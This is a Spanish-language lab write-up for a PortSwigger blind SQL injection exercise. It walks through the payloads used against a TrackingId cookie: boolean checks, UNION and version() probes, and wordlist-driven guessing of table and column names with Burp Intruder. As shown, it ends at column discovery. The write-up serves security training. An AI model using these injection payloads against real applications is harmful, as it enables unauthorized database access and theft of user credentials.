---
title: "11 Blind SQL injection with conditional responses"
collection: publications
category: portswigger
permalink: /publications/11_Blind SQL injection with conditional responses
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. Para resolver el laboratorio, realizamos un ataque de inyección SQL basado en ciego en la base de datos que recupera la contraseña del usuario administrador en la aplicación.'
date: 2024-12-01
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Blind SQL injection with conditional responses'
---

![logo]({{site.url}}/images/SQLi/sqli-11/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-11/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, inicia sesión como usuario administrador.

## Analisis del campo vulnerable

En esta ocación vamos a probar el `TrackingId` si es vulnerable a SQLi. La consulta se puede ver algo asi.

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```

En el caso del ejemplo, la cookie contiene este contenido `TrackingId=ZJhQ1n4d7AtpomKX; session=EFsqVmORVFUeAKHnozfDBoJgsSyivWVL`

![Cookie]({{site.url}}/images/SQLi/sqli-11/cookie.png)

Si la cookie existe y es verdadera mostrara el mensaje `Welcome back!`.

![Welcome]({{site.url}}/images/SQLi/sqli-11/welcome.png)

En caso que el `TrackingId` sea falso no mostrara mensaje

![Welcome]({{site.url}}/images/SQLi/sqli-11/invalido.png)

## Comprobamos que el campo sea vulnerable - SQLi a ciegas

Payload cargado

```javascript
' and 1=1 --
```

La consulta se veria algo asi, donde comprueba el ID es valido y 1=1 es True, la consulta es valida.

```javascript
SELECT trackingId FROM someTable WHERE trackingId = 'ZJhQ1n4d7AtpomKX' and 1=1 -- '
```

![Welcome]({{site.url}}/images/SQLi/sqli-11/Payload Valido.png)

En caso que la consulta no sea valida no mostrara mensaje de `Welcome back!`, cargaremos un Payload False.

```javascript
' and 1=2 --
```
![Welcome]({{site.url}}/images/SQLi/sqli-11/Payload Invalido.png)

## Miramos cuantas columnas tiene

```javascript
' ORDER BY 1--
```

![Order By]({{site.url}}/images/SQLi/sqli-11/order by.png)

## Miramos que el campo sea String

El campo es de tipo `String`

```javascript
' UNION SELECT 'A'--
```

![String]({{site.url}}/images/SQLi/sqli-11/string.png)

## Miramos que BD esta corriendo

En este caso muestra el mensaje `Welcome back!` con la consulta de la version de Postgres.

```sql
' UNION SELECT version()--
```

![bd]({{site.url}}/images/SQLi/sqli-11/bd.png)

## Comprobamos nombre de tablas

Ya que `no` conocemos las tablas que tiene la BD, haremos un ataque para comprobar que tablas existen. Si existe la tabla tendra que mostrar el mensaje `Welcom back!` de lo contrario no mostrara nada. 

```sql
' and (SELECT 'x' FROM <TABLA> LIMIT 1)='x'--
```

Vamos a usar la herramienta intruder para hacer el ataque.

![Intruder]({{site.url}}/images/SQLi/sqli-11/intruder.png)

Ejemplo de nombre de tablas:

```text
products
items
inventory
orders
order_items
sales
transactions
pricing
categories
customers
clients
users
profiles
subscriptions
addresses
```

Filtramos por las que tengan el mensaje de `Welcome back!` y esa tabla deberia de existir

![filtro]({{site.url}}/images/SQLi/sqli-11/filtro.png)

Filtrado

![filtro]({{site.url}}/images/SQLi/sqli-11/filtrado.png)

## Comprobamos nombres de los campos que tiene la tablas

Ya que `no` conocemos las el nombre de las filas que tiene la tablas, haremos un ataque para comprobar que nombres tiene los campos de la tabla. Si coincide algun campo tendra que mostrar el mensaje `Welcom back!` de lo contrario no mostrara nada. 

```list
id
user_id
username
email
phone_number
uuid
password
hashed_password
salt
token
last_login
login_attempts
first_name
last_name
full_name
date_of_birth
gender
address
city
state
country
postal_code
role
role_id
permissions
is_admin
is_active
```

```sql
' AND EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name = 'users' AND column_name = 'PAYLOAD')--
```

![columnas]({{site.url}}/images/SQLi/sqli-11/columnas.png)

Filtramos por el mensaje de `Welcome back!`

![columnas]({{site.url}}/images/SQLi/sqli-11/Filtro Columna.png)

Columnas filtradas que tienen el mensaje de `Welcome back!`

![columnas]({{site.url}}/images/SQLi/sqli-11/columnas filtradas.png)
